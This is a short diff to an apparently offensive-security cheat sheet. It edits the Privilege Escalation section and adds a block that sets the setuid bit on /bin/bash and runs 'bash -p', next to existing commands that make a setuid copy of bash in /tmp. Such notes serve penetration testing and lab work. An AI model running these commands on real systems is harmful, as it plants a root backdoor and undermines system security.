@@ -126,9 +126,14 @@ script -qc /bin/bash /dev/null
 *[source](https://github.com/acole76/pentestmonkey-cheatsheets/blob/master/shells.md)*
 
 # Privilege Escalation
-```
+```bash
 /bin/cp /bin/bash /tmp/bash_up; /bin/chown user:group /tmp/bash_up; chmod g+s /tmp/bash_up; chmod u+s /tmp/bash_up
 /tmp/bash_up -p
+```
+
+```bash
+chmod 4755 /bin/bash
+bash -p
 ```
 
 # SCP
